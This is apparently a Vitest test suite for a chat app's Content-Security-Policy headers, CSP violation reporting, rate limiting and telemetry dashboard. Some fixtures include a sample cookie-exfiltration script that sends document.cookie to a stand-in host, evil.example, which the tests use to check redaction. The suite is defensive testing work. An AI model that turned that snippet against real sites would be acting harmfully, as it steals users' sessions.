import { describe, expect, it } from 'vitest'
import {
  addNonceToScriptTags,
  htmlSecurityHeaders,
  normalizeCspReportPayload,
  shouldAcceptCspReport
} from '../../server/utils/security-headers'
import { handleCspReportPayload, handleCspReportPayloadAsync } from '../../server/utils/csp-report-handler'
import { InMemoryCspTelemetryStore } from '../../server/utils/csp-telemetry-store'
import { InMemoryCspReportRateLimiter } from '../../server/utils/csp-report-rate-limiter'
import {
  createDefaultCspRateLimitTelemetryStore,
  InMemoryCspRateLimitTelemetryStore,
  PostgresCspRateLimitTelemetryStore
} from '../../server/utils/csp-rate-limit-telemetry-store'
import {
  buildCspTelemetryDashboard,
  isCspTelemetryOperatorAuthorized
} from '../../server/utils/csp-telemetry-dashboard'
import {
  createCspAlertThresholdOptions,
  evaluateCspTelemetryAlert
} from '../../server/utils/csp-alert-threshold'
import { InMemoryCspAlertTransitionStore } from '../../server/utils/csp-alert-transition-store'
import {
  acknowledgeCspAlert,
  cspAlertFingerprint,
  InMemoryCspAlertAcknowledgementStore
} from '../../server/utils/csp-alert-acknowledgement-store'
import { InMemoryCspAlertIncidentStore } from '../../server/utils/csp-alert-incident-store'
import {
  createDefaultCspTelemetryStore,
  PostgresCspTelemetryStore
} from '../../server/utils/csp-telemetry-store'
import {
  createTrustedProxyCidrs,
  cspRateLimitSubjectDiagnosticsFor,
  rateLimitSubjectFor
} from '../../server/utils/csp-rate-limit-subject'

describe('Nuxt HTML security headers', () => {
  it('defines deployment security headers with a script nonce for rendered HTML responses', () => {
    const headers = htmlSecurityHeaders({
      scriptNonce: 'nonce-test-123',
      connectSources: ['https://api.discord-clone.local', 'wss://rtc.discord-clone.local']
    })

    expect(headers['Content-Security-Policy']).toContain("default-src 'self'")
    expect(headers['Content-Security-Policy']).toContain("frame-ancestors 'none'")
    expect(headers['Content-Security-Policy']).toContain("style-src 'self'")
    expect(headers['Content-Security-Policy']).not.toContain("style-src 'self' 'unsafe-inline'")
    expect(headers['Content-Security-Policy']).toContain("script-src 'self' 'nonce-nonce-test-123'")
    expect(headers['Content-Security-Policy']).not.toContain("script-src 'self' 'unsafe-inline'")
    expect(headers['Content-Security-Policy']).toContain('ws://127.0.0.1:*')
    expect(headers['Content-Security-Policy']).toContain('https://api.discord-clone.local')
    expect(headers['Content-Security-Policy']).toContain('wss://rtc.discord-clone.local')
    expect(headers['X-Content-Type-Options']).toBe('nosniff')
    expect(headers['X-Frame-Options']).toBe('DENY')
    expect(headers['Referrer-Policy']).toBe('no-referrer')
    expect(headers['Permissions-Policy']).toBe('camera=(), microphone=(self), geolocation=()')
  })

  it('adds the matching nonce to rendered script tags without duplicating existing nonces', () => {
    const html = [
      '<script>window.__NUXT__={}</script>',
      '<script type="module" src="/_nuxt/entry.js"></script>',
      '<script nonce="already-set">console.log("kept")</script>'
    ]

    const secured = addNonceToScriptTags(html, 'nonce-test-123')

    expect(secured[0]).toBe('<script nonce="nonce-test-123">window.__NUXT__={}</script>')
    expect(secured[1]).toBe('<script nonce="nonce-test-123" type="module" src="/_nuxt/entry.js"></script>')
    expect(secured[2]).toBe('<script nonce="already-set">console.log("kept")</script>')
  })

  it('adds CSP report endpoints and a stricter report-only style policy without weakening script nonce policy', () => {
    const headers = htmlSecurityHeaders({
      scriptNonce: 'nonce-test-123',
      connectSources: ['https://api.discord-clone.local'],
      cspReporting: {
        enforceEndpoint: '/api/security/csp-report',
        reportOnlyEndpoint: '/api/security/csp-report-only'
      }
    })

    expect(headers['Content-Security-Policy']).toContain("script-src 'self' 'nonce-nonce-test-123'")
    expect(headers['Content-Security-Policy']).not.toContain("script-src 'self' 'unsafe-inline'")
    expect(headers['Content-Security-Policy']).toContain("style-src 'self'")
    expect(headers['Content-Security-Policy']).not.toContain("style-src 'self' 'unsafe-inline'")
    expect(headers['Content-Security-Policy']).toContain('report-to csp-endpoint')
    expect(headers['Content-Security-Policy']).toContain('report-uri /api/security/csp-report')
    expect(headers['Content-Security-Policy-Report-Only']).toContain("style-src 'self'")
    expect(headers['Content-Security-Policy-Report-Only']).not.toContain("style-src 'self' 'unsafe-inline'")
    expect(headers['Content-Security-Policy-Report-Only']).toContain('report-to csp-report-only')
    expect(headers['Reporting-Endpoints']).toBe(
      'csp-endpoint="/api/security/csp-report", csp-report-only="/api/security/csp-report-only"'
    )
  })

  it('normalizes classic CSP reports while stripping sensitive URLs and samples', () => {
    const normalized = normalizeCspReportPayload(JSON.stringify({
      'csp-report': {
        'document-uri': 'https://app.discord-clone.local/channels/general?token=secret',
        'blocked-uri': 'https://evil.example/steal?authorization=Bearer%20secret',
        'violated-directive': "script-src 'self'",
        'effective-directive': 'script-src',
        disposition: 'enforce',
        'script-sample': 'fetch("https://evil.example?cookie=" + document.cookie)',
        referrer: 'https://app.discord-clone.local/login?access_token=secret'
      }
    }), {
      requestId: 'req-csp-1',
      userAgent: 'Mozilla/5.0 secret browser'
    })

    expect(normalized.accepted).toBe(true)
    expect(normalized.report).toMatchObject({
      requestId: 'req-csp-1',
      documentUriOrigin: 'https://app.discord-clone.local',
      blockedUriOrigin: 'https://evil.example',
      violatedDirective: "script-src 'self'",
      effectiveDirective: 'script-src',
      disposition: 'enforce'
    })
    expect(normalized.report?.userAgentHash).toMatch(/^[a-f0-9]{64}$/)
    expect(JSON.stringify(normalized)).not.toContain('secret')
    expect(JSON.stringify(normalized)).not.toContain('document.cookie')
  })

  it('normalizes Reporting API arrays and rejects oversized or unsupported report bodies', () => {
    const normalized = normalizeCspReportPayload(JSON.stringify([
      {
        type: 'csp-violation',
        url: 'https://app.discord-clone.local/@me?session=secret',
        body: {
          blockedURL: 'inline',
          violatedDirective: 'style-src',
          effectiveDirective: 'style-src',
          disposition: 'report',
          sample: 'color:red'
        }
      }
    ]), {
      requestId: 'req-csp-2',
      userAgent: 'Playwright'
    })

    expect(normalized.accepted).toBe(true)
    expect(normalized.report).toMatchObject({
      requestId: 'req-csp-2',
      documentUriOrigin: 'https://app.discord-clone.local',
      blockedUriOrigin: 'inline',
      violatedDirective: 'style-src',
      effectiveDirective: 'style-src',
      disposition: 'report'
    })
    expect(shouldAcceptCspReport('application/csp-report', '{"ok":true}')).toBe(true)
    expect(shouldAcceptCspReport('text/plain', '{"ok":true}')).toBe(false)
    expect(shouldAcceptCspReport('application/json', 'x'.repeat(16_385))).toBe(false)
    expect(normalizeCspReportPayload('{not-json', { requestId: 'req-csp-3', userAgent: '' }).accepted).toBe(false)
  })

  it('handles CSP report endpoint payloads with safe no-content responses', () => {
    const result = handleCspReportPayload({
      body: JSON.stringify({
        'csp-report': {
          'document-uri': 'https://app.discord-clone.local/',
          'blocked-uri': 'inline',
          'violated-directive': 'style-src',
          'effective-directive': 'style-src',
          disposition: 'report'
        }
      }),
      contentType: 'application/csp-report',
      requestId: 'req-csp-4',
      userAgent: 'Playwright'
    })

    expect(result.statusCode).toBe(204)
    expect(result.accepted).toBe(true)
    expect(result.report?.blockedUriOrigin).toBe('inline')

    const rejected = handleCspReportPayload({
      body: 'x'.repeat(16_385),
      contentType: 'application/json',
      requestId: 'req-csp-5',
      userAgent: 'Playwright'
    })

    expect(rejected.statusCode).toBe(204)
    expect(rejected.accepted).toBe(false)
    expect(rejected.report).toBeUndefined()
  })

  it('persists accepted CSP telemetry without storing rejected or raw sensitive payloads', () => {
    const store = new InMemoryCspTelemetryStore({ maxEntries: 10 })
    const result = handleCspReportPayload({
      body: JSON.stringify({
        'csp-report': {
          'document-uri': 'https://app.discord-clone.local/channels/general?token=secret',
          'blocked-uri': 'https://evil.example/steal?authorization=secret',
          'violated-directive': 'style-src',
          'effective-directive': 'style-src',
          disposition: 'report',
          'script-sample': 'document.cookie'
        }
      }),
      contentType: 'application/csp-report',
      requestId: 'req-csp-telemetry-1',
      userAgent: 'Sensitive Browser'
    }, {
      telemetryStore: store,
      now: () => new Date('2026-05-18T00:00:00.000Z')
    })

    handleCspReportPayload({
      body: 'x'.repeat(16_385),
      contentType: 'application/json',
      requestId: 'req-csp-telemetry-2',
      userAgent: 'Sensitive Browser'
    }, {
      telemetryStore: store,
      now: () => new Date('2026-05-18T00:00:01.000Z')
    })

    expect(result.accepted).toBe(true)
    expect(store.recent()).toHaveLength(1)
    expect(store.recent()[0]).toMatchObject({
      receivedAt: '2026-05-18T00:00:00.000Z',
      report: {
        requestId: 'req-csp-telemetry-1',
        documentUriOrigin: 'https://app.discord-clone.local',
        blockedUriOrigin: 'https://evil.example',
        effectiveDirective: 'style-src'
      }
    })
    expect(store.summary()).toEqual({
      total: 1,
      byEffectiveDirective: {
        'style-src': 1
      }
    })
    expect(JSON.stringify(store.recent())).not.toContain('secret')
    expect(JSON.stringify(store.recent())).not.toContain('document.cookie')
  })

  it('rate limits CSP reports by subject before parsing or storing telemetry', () => {
    const store = new InMemoryCspTelemetryStore({ maxEntries: 10 })
    const rateLimitTelemetry = new InMemoryCspRateLimitTelemetryStore()
    const rateLimiter = new InMemoryCspReportRateLimiter({
      maxReports: 2,
      windowMs: 60_000
    })
    const reportBody = JSON.stringify({
      'csp-report': {
        'document-uri': 'https://app.discord-clone.local/',
        'blocked-uri': 'inline',
        'violated-directive': 'style-src',
        'effective-directive': 'style-src',
        disposition: 'report'
      }
    })
    const submit = (requestId: string, now: Date) => handleCspReportPayload({
      body: reportBody,
      contentType: 'application/csp-report',
      requestId,
      userAgent: 'Playwright',
      rateLimitSubject: '203.0.113.10'
    }, {
      telemetryStore: store,
      rateLimiter,
      rateLimitTelemetry,
      now: () => now
    })

    expect(submit('req-csp-rate-1', new Date('2026-05-18T00:00:00.000Z')).accepted).toBe(true)
    expect(submit('req-csp-rate-2', new Date('2026-05-18T00:00:01.000Z')).accepted).toBe(true)

    const limited = submit('req-csp-rate-3', new Date('2026-05-18T00:00:02.000Z'))

    expect(limited).toMatchObject({
      accepted: false,
      statusCode: 204,
      reason: 'rate limited'
    })
    expect(store.recent()).toHaveLength(2)
    expect(rateLimitTelemetry.summary()).toEqual({
      limitedTotal: 1
    })

    expect(submit('req-csp-rate-4', new Date('2026-05-18T00:01:01.000Z')).accepted).toBe(true)
    expect(store.recent()).toHaveLength(3)
    expect(rateLimitTelemetry.summary()).toEqual({
      limitedTotal: 1
    })
  })

  it('awaits async CSP rate-limit telemetry stores before returning a limited response', async () => {
    const rateLimiter = new InMemoryCspReportRateLimiter({
      maxReports: 1,
      windowMs: 60_000
    })
    let recorded = false
    const rateLimitTelemetry = {
      async recordLimited() {
        await Promise.resolve()
        recorded = true
      },
      async summary() {
        return { limitedTotal: recorded ? 1 : 0 }
      }
    }

    await handleCspReportPayloadAsync({
      body: '{"csp-report":{}}',
      contentType: 'application/csp-report',
      requestId: 'req-csp-async-rate-limit-first',
      userAgent: 'Playwright',
      rateLimitSubject: '203.0.113.10'
    }, {
      rateLimiter,
      rateLimitTelemetry
    })

    const result = await handleCspReportPayloadAsync({
      body: '{"csp-report":{}}',
      contentType: 'application/csp-report',
      requestId: 'req-csp-async-rate-limit',
      userAgent: 'Playwright',
      rateLimitSubject: '203.0.113.10'
    }, {
      rateLimiter,
      rateLimitTelemetry
    })

    expect(result).toMatchObject({
      accepted: false,
      statusCode: 204,
      reason: 'rate limited'
    })
    expect(recorded).toBe(true)
  })

  it('selects a Postgres CSP rate-limit telemetry store when central telemetry database is configured', async () => {
    const store = createDefaultCspRateLimitTelemetryStore({
      databaseUrl: 'postgres://dev_user:dev_password@127.0.0.1:15432/discord'
    })
    expect(store).toBeInstanceOf(PostgresCspRateLimitTelemetryStore)
    await store.close?.()
  })

  it('normalizes CSP rate-limit subjects only through trusted proxies', () => {
    expect(rateLimitSubjectFor({
      forwardedFor: '203.0.113.10',
      realIp: '203.0.113.11',
      remoteAddress: '198.51.100.20',
      trustedProxyCidrs: []
    })).toBe('198.51.100.20')

    expect(rateLimitSubjectFor({
      forwardedFor: '203.0.113.10, 10.0.0.25',
      realIp: '203.0.113.11',
      remoteAddress: '10.0.0.25',
      trustedProxyCidrs: ['10.0.0.0/8']
    })).toBe('203.0.113.10')

    expect(rateLimitSubjectFor({
      forwardedFor: 'not-an-ip',
      realIp: '203.0.113.11',
      remoteAddress: '::ffff:10.0.0.25',
      trustedProxyCidrs: ['10.0.0.0/8']
    })).toBe('203.0.113.11')

    expect(createTrustedProxyCidrs({
      NUXT_CSP_RATE_LIMIT_TRUSTED_PROXY_CIDRS: '10.0.0.0/8, 127.0.0.1'
    })).toEqual(['10.0.0.0/8', '127.0.0.1'])
  })

  it('builds secret-safe CSP rate-limit subject diagnostics without raw IP exposure', () => {
    const diagnostics = cspRateLimitSubjectDiagnosticsFor({
      forwardedFor: '203.0.113.10, 10.0.0.25',
      realIp: '203.0.113.11',
      remoteAddress: '10.0.0.25',
      trustedProxyCidrs: ['10.0.0.0/8']
    })

    expect(diagnostics).toEqual({
      source: 'x-forwarded-for',
      subjectHashPrefix: expect.stringMatching(/^[a-f0-9]{12}$/),
      trustedProxyConfigured: true,
      trustedProxyMatched: true,
      trustedProxyRuleCount: 1,
      forwardedForPresent: true,
      realIpPresent: true
    })
    expect(JSON.stringify(diagnostics)).not.toContain('203.0.113')
    expect(JSON.stringify(diagnostics)).not.toContain('10.0.0.25')
  })

  it('builds a bounded CSP telemetry dashboard without exposing sensitive report data', async () => {
    const store = new InMemoryCspTelemetryStore({ maxEntries: 10 })
    const submit = (requestId: string, effectiveDirective: string, blockedUri: string, now: string) => {
      handleCspReportPayload({
        body: JSON.stringify({
          'csp-report': {
            'document-uri': 'https://app.discord-clone.local/channels/general?token=secret',
            'blocked-uri': blockedUri,
            'violated-directive': `${effectiveDirective} 'self'`,
            'effective-directive': effectiveDirective,
            disposition: 'report',
            'script-sample': 'document.cookie'
          }
        }),
        contentType: 'application/csp-report',
        requestId,
        userAgent: 'Sensitive Browser'
      }, {
        telemetryStore: store,
        now: () => new Date(now)
      })
    }
    submit('req-dashboard-1', 'style-src', 'inline', '2026-05-19T00:00:00.000Z')
    submit('req-dashboard-2', 'script-src', 'https://cdn.example.test/app.js?token=secret', '2026-05-19T00:00:01.000Z')
    submit('req-dashboard-3', 'style-src', 'https://evil.example/steal?authorization=secret', '2026-05-19T00:00:02.000Z')

    const rateLimitTelemetry = new InMemoryCspRateLimitTelemetryStore()
    rateLimitTelemetry.recordLimited({
      subject: '203.0.113.10',
      at: new Date('2026-05-19T00:00:03.000Z'),
      resetAt: '2026-05-19T00:01:00.000Z'
    })

    const dashboard = await buildCspTelemetryDashboard(store, {
      recentLimit: 2,
      rateLimitTelemetryStore: rateLimitTelemetry,
      now: () => new Date('2026-05-19T00:30:00.000Z'),
      alertThresholds: {
        totalReportThreshold: 3,
        directiveReportThreshold: 2
      }
    })

    expect(dashboard.summary.total).toBe(3)
    expect(dashboard.alert).toMatchObject({
      active: true,
      reasons: [
        'total reports 3 reached threshold 3',
        'style-src reports 2 reached threshold 2'
      ]
    })
    expect(dashboard.alert.fingerprint).toMatch(/^[a-f0-9]{24}$/)
    expect(dashboard.rateLimit.limitedTotal).toBe(1)
    expect(dashboard.summary.topDirectives).toEqual([
      { directive: 'style-src', count: 2 },
      { directive: 'script-src', count: 1 }
    ])
    expect(dashboard.trend).toEqual({
      windowHours: 6,
      buckets: [
        { bucketStart: '2026-05-18T19:00:00.000Z', total: 0 },
        { bucketStart: '2026-05-18T20:00:00.000Z', total: 0 },
        { bucketStart: '2026-05-18T21:00:00.000Z', total: 0 },
        { bucketStart: '2026-05-18T22:00:00.000Z', total: 0 },
        { bucketStart: '2026-05-18T23:00:00.000Z', total: 0 },
        { bucketStart: '2026-05-19T00:00:00.000Z', total: 3 }
      ]
    })
    expect(dashboard.recent).toHaveLength(2)
    expect(dashboard.recent[0]).toMatchObject({
      requestId: 'req-dashboard-3',
      effectiveDirective: 'style-src',
      blockedUriOrigin: 'https://evil.example',
      documentUriOrigin: 'https://app.discord-clone.local'
    })
    expect(JSON.stringify(dashboard)).not.toContain('secret')
    expect(JSON.stringify(dashboard)).not.toContain('document.cookie')
    expect(JSON.stringify(dashboard)).not.toContain('Sensitive Browser')
  })

  it('builds the CSP dashboard with an async rate-limit telemetry summary', async () => {
    const dashboard = await buildCspTelemetryDashboard(new InMemoryCspTelemetryStore(), {
      rateLimitTelemetryStore: {
        recordLimited: async () => {},
        summary: async () => ({ limitedTotal: 7 })
      },
      rateLimiter: {
        consume: () => ({
          allowed: true,
          limit: 1,
          remaining: 0,
          resetAt: '2026-05-19T00:01:00.000Z'
        }),
        lifecycleMetrics: () => ({
          backend: 'redis',
          failClosedDecisions: 2,
          redis: {
            connectAttempts: 3,
            connectSuccesses: 2,
            connectFailures: 1,
            errorEvents: 1,
            reconnectEvents: 1,
            closeCalls: 1,
            lastErrorAt: '2026-05-19T00:00:30.000Z'
          }
        })
      }
    })

    expect(dashboard.rateLimit.limitedTotal).toBe(7)
    expect(dashboard.rateLimit.lifecycle).toEqual({
      backend: 'redis',
      failClosedDecisions: 2,
      redis: {
        connectAttempts: 3,
        connectSuccesses: 2,
        connectFailures: 1,
        errorEvents: 1,
        reconnectEvents: 1,
        closeCalls: 1,
        lastErrorAt: '2026-05-19T00:00:30.000Z'
      }
    })
    expect(JSON.stringify(dashboard.rateLimit.lifecycle)).not.toContain('redis://')
    expect(JSON.stringify(dashboard.rateLimit.lifecycle)).not.toContain('dev_password')
  })

  it('surfaces CSP telemetry storage health in the dashboard payload', async () => {
    const dashboard = await buildCspTelemetryDashboard({
      async summary() {
        return { total: 0, byEffectiveDirective: {} }
      },
      async retentionMetrics() {
        return { discardedTotal: 0, discardedByAge: 0, discardedByMaxEntries: 0 }
      },
      async recent() {
        return []
      },
      async record() {},
      async health() {
        return {
          backend: 'postgres',
          ok: false,
          writeFailures: 2,
          lastWriteFailureAt: '2026-05-20T00:00:00.000Z',
          lastError: 'connection unavailable'
        }
      }
    })

    expect(dashboard.health.storage).toEqual({
      backend: 'postgres',
      ok: false,
      writeFailures: 2,
      lastWriteFailureAt: '2026-05-20T00:00:00.000Z',
      lastError: 'connection unavailable'
    })
  })

  it('persists CSP alert transitions for later dashboard review', async () => {
    const telemetry = new InMemoryCspTelemetryStore()
    const alertTransitions = new InMemoryCspAlertTransitionStore()

    const initialDashboard = await buildCspTelemetryDashboard(telemetry, {
      alertTransitionStore: alertTransitions,
      alertThresholds: {
        totalReportThreshold: 2
      },
      now: () => new Date('2026-05-20T00:00:00.000Z')
    })

    telemetry.record(sampleReport('req-alert-1', 'style-src'), new Date('2026-05-20T00:00:01.000Z'))
    telemetry.record(sampleReport('req-alert-2', 'style-src'), new Date('2026-05-20T00:00:02.000Z'))

    const activeDashboard = await buildCspTelemetryDashboard(telemetry, {
      alertTransitionStore: alertTransitions,
      alertThresholds: {
        totalReportThreshold: 2
      },
      now: () => new Date('2026-05-20T00:00:03.000Z')
    })
    const duplicateActiveDashboard = await buildCspTelemetryDashboard(telemetry, {
      alertTransitionStore: alertTransitions,
      alertThresholds: {
        totalReportThreshold: 2
      },
      now: () => new Date('2026-05-20T00:00:04.000Z')
    })

    expect(initialDashboard.alertHistory).toEqual([
      {
        active: false,
        observedAt: '2026-05-20T00:00:00.000Z',
        reasons: []
      }
    ])
    expect(activeDashboard.alertHistory).toEqual([
      {
        active: true,
        observedAt: '2026-05-20T00:00:03.000Z',
        reasons: ['total reports 2 reached threshold 2']
      },
      {
        active: false,
        observedAt: '2026-05-20T00:00:00.000Z',
        reasons: []
      }
    ])
    expect(duplicateActiveDashboard.alertHistory).toHaveLength(2)
  })

  it('surfaces CSP alert acknowledgement and snooze state without storing raw reasons as identity', async () => {
    const telemetry = new InMemoryCspTelemetryStore()
    const acknowledgements = new InMemoryCspAlertAcknowledgementStore()
    telemetry.record(sampleReport('req-alert-ack-1', 'style-src'), new Date('2026-05-20T00:00:01.000Z'))
    telemetry.record(sampleReport('req-alert-ack-2', 'style-src'), new Date('2026-05-20T00:00:02.000Z'))

    const alert = evaluateCspTelemetryAlert(await telemetry.summary(), {
      totalReportThreshold: 2
    })
    const fingerprint = cspAlertFingerprint(alert)
    await acknowledgements.acknowledge({
      fingerprint,
      reason: 'Known deployment',
      acknowledgedBy: 'operator-user',
      acknowledgedAt: new Date('2026-05-20T00:00:03.000Z'),
      snoozeUntil: new Date('2026-05-20T00:15:03.000Z')
    })

    const dashboard = await buildCspTelemetryDashboard(telemetry, {
      alertAcknowledgementStore: acknowledgements,
      alertThresholds: {
        totalReportThreshold: 2
      },
      now: () => new Date('2026-05-20T00:05:00.000Z')
    })

    expect(dashboard.alert.fingerprint).toBe(fingerprint)
    expect(dashboard.alertAcknowledgement).toEqual({
      fingerprint,
      status: 'snoozed',
      reason: 'Known deployment',
      acknowledgedBy: 'operator-user',
      acknowledgedAt: '2026-05-20T00:00:03.000Z',
      snoozeUntil: '2026-05-20T00:15:03.000Z'
    })
    expect(JSON.stringify(dashboard.alertAcknowledgement)).not.toContain('total reports 2 reached threshold 2')
  })

  it('appends CSP alert incident history when an operator acknowledges an active alert', async () => {
    const acknowledgements = new InMemoryCspAlertAcknowledgementStore()
    const incidentStore = new InMemoryCspAlertIncidentStore()
    const alert = {
      active: true,
      reasons: ['total reports 2 reached threshold 2'],
      fingerprint: cspAlertFingerprint({
        active: true,
        reasons: ['total reports 2 reached threshold 2']
      })
    }

    const acknowledgement = await acknowledgeCspAlert({
      alert,
      store: acknowledgements,
      incidentStore,
      reason: 'Known deployment',
      acknowledgedBy: 'operator-user',
      snoozeMinutes: 15,
      now: () => new Date('2026-05-20T00:00:03.000Z')
    })

    expect(acknowledgement.status).toBe('snoozed')
    const incidentEvents = await incidentStore.recent(alert.fingerprint)
    expect(incidentEvents).toEqual([
      {
        fingerprint: alert.fingerprint,
        eventType: 'snoozed',
        status: 'snoozed',
        actor: 'operator-user',
        assignedTo: 'operator-user',
        reason: 'Known deployment',
        occurredAt: '2026-05-20T00:00:03.000Z',
        snoozeUntil: '2026-05-20T00:15:03.000Z'
      }
    ])
    expect(JSON.stringify(incidentEvents)).not.toContain('total reports 2 reached threshold 2')
  })

  it('surfaces recent CSP alert incident history in the dashboard payload', async () => {
    const telemetry = new InMemoryCspTelemetryStore()
    const incidentStore = new InMemoryCspAlertIncidentStore()
    telemetry.record(sampleReport('req-alert-incident-1', 'style-src'), new Date('2026-05-20T00:00:01.000Z'))
    telemetry.record(sampleReport('req-alert-incident-2', 'style-src'), new Date('2026-05-20T00:00:02.000Z'))
    const alert = evaluateCspTelemetryAlert(await telemetry.summary(), {
      totalReportThreshold: 2
    })
    const fingerprint = cspAlertFingerprint(alert)
    incidentStore.append({
      fingerprint,
      eventType: 'acknowledged',
      status: 'acknowledged',
      actor: 'operator-user',
      assignedTo: 'operator-user',
      reason: 'Known deployment',
      occurredAt: '2026-05-20T00:00:03.000Z'
    })

    const dashboard = await buildCspTelemetryDashboard(telemetry, {
      alertIncidentStore: incidentStore,
      alertThresholds: {
        totalReportThreshold: 2
      }
    })

    expect(dashboard.alertIncidentHistory).toEqual([
      {
        fingerprint,
        eventType: 'acknowledged',
        status: 'acknowledged',
        actor: 'operator-user',
        assignedTo: 'operator-user',
        reason: 'Known deployment',
        occurredAt: '2026-05-20T00:00:03.000Z'
      }
    ])
    expect(JSON.stringify(dashboard.alertIncidentHistory)).not.toContain('total reports 2 reached threshold 2')
  })

  it('validates CSP alert acknowledgement reasons and bounded snooze windows', async () => {
    await expect(acknowledgeCspAlert({
      alert: {
        active: true,
        reasons: ['total reports 2 reached threshold 2'],
        fingerprint: cspAlertFingerprint({
          active: true,
          reasons: ['total reports 2 reached threshold 2']
        })
      },
      store: new InMemoryCspAlertAcknowledgementStore(),
      reason: '   ',
      acknowledgedBy: 'operator-user',
      now: () => new Date('2026-05-20T00:00:00.000Z')
    })).rejects.toThrow('acknowledgement reason is required')

    await expect(acknowledgeCspAlert({
      alert: {
        active: true,
        reasons: ['total reports 2 reached threshold 2'],
        fingerprint: cspAlertFingerprint({
          active: true,
          reasons: ['total reports 2 reached threshold 2']
        })
      },
      store: new InMemoryCspAlertAcknowledgementStore(),
      reason: 'Investigating',
      acknowledgedBy: 'operator-user',
      snoozeMinutes: 1_441,
      now: () => new Date('2026-05-20T00:00:00.000Z')
    })).rejects.toThrow('snoozeMinutes must be between 1 and 1440')
  })

  it('surfaces CSP telemetry retention discard metrics in the dashboard payload', async () => {
    const store = new InMemoryCspTelemetryStore({
      maxEntries: 2,
      maxAgeMs: 60_000
    })
    store.record(sampleReport('req-retention-old', 'style-src'), new Date('2026-05-19T00:00:00.000Z'))
    store.record(sampleReport('req-retention-recent-1', 'style-src'), new Date('2026-05-19T00:02:00.000Z'))
    store.record(sampleReport('req-retention-recent-2', 'script-src'), new Date('2026-05-19T00:02:01.000Z'))
    store.record(sampleReport('req-retention-recent-3', 'img-src'), new Date('2026-05-19T00:02:02.000Z'))

    const dashboard = await buildCspTelemetryDashboard(store)

    expect(dashboard.summary.total).toBe(2)
    expect(dashboard.retention).toEqual({
      discardedTotal: 2,
      discardedByAge: 1,
      discardedByMaxEntries: 1
    })
  })

  it('evaluates CSP telemetry alert thresholds from aggregate counts only', () => {
    expect(evaluateCspTelemetryAlert({
      total: 1,
      byEffectiveDirective: {
        'style-src': 1
      }
    }, {
      totalReportThreshold: 2,
      directiveReportThreshold: 2
    })).toEqual({
      active: false,
      reasons: []
    })

    expect(evaluateCspTelemetryAlert({
      total: 4,
      byEffectiveDirective: {
        'script-src': 1,
        'style-src': 3
      }
    }, {
      totalReportThreshold: 4,
      directiveReportThreshold: 3
    })).toEqual({
      active: true,
      reasons: [
        'total reports 4 reached threshold 4',
        'style-src reports 3 reached threshold 3'
      ]
    })
  })

  it('parses CSP telemetry alert threshold options from environment values', () => {
    expect(createCspAlertThresholdOptions({
      NUXT_CSP_ALERT_TOTAL_THRESHOLD: '10',
      NUXT_CSP_ALERT_DIRECTIVE_THRESHOLD: '3'
    })).toEqual({
      totalReportThreshold: 10,
      directiveReportThreshold: 3
    })
    expect(createCspAlertThresholdOptions({
      NUXT_CSP_ALERT_TOTAL_THRESHOLD: '0',
      NUXT_CSP_ALERT_DIRECTIVE_THRESHOLD: 'not-a-number'
    })).toEqual({})
  })

  it('guards CSP telemetry dashboard reads when an operator token is configured', () => {
    expect(isCspTelemetryOperatorAuthorized({ configuredToken: '', providedToken: undefined })).toBe(true)
    expect(isCspTelemetryOperatorAuthorized({ configuredToken: 'ops-token', providedToken: 'ops-token' })).toBe(true)
    expect(isCspTelemetryOperatorAuthorized({ configuredToken: 'ops-token', providedToken: undefined })).toBe(false)
    expect(isCspTelemetryOperatorAuthorized({ configuredToken: 'ops-token', providedToken: 'wrong-token' })).toBe(false)
  })

  it('prunes in-memory CSP telemetry by retention age', () => {
    const store = new InMemoryCspTelemetryStore({
      maxEntries: 10,
      maxAgeMs: 60_000
    })
    store.record(sampleReport('req-memory-old', 'style-src'), new Date('2026-05-19T00:00:00.000Z'))
    store.record(sampleReport('req-memory-recent', 'script-src'), new Date('2026-05-19T00:02:00.000Z'))

    expect(store.recent()).toHaveLength(1)
    expect(store.recent()[0].report.requestId).toBe('req-memory-recent')
    expect(store.summary()).toEqual({
      total: 1,
      byEffectiveDirective: {
        'script-src': 1
      }
    })
  })

  it('selects a Postgres CSP telemetry store only when a database URL is configured', async () => {
    const memoryStore = createDefaultCspTelemetryStore({})
    expect(memoryStore).toBeInstanceOf(InMemoryCspTelemetryStore)

    const databaseStore = createDefaultCspTelemetryStore({
      databaseUrl: 'postgres://dev_user:dev_password@127.0.0.1:15432/discord'
    })
    expect(databaseStore).toBeInstanceOf(PostgresCspTelemetryStore)
    await databaseStore.close?.()
  })
})

const sampleReport = (requestId: string, effectiveDirective: string) => ({
  requestId,
  documentUriOrigin: 'https://app.discord-clone.local',
  blockedUriOrigin: 'inline',
  violatedDirective: `${effectiveDirective} 'self'`,
  effectiveDirective,
  disposition: 'report' as const,
  userAgentHash: '0'.repeat(64)
})
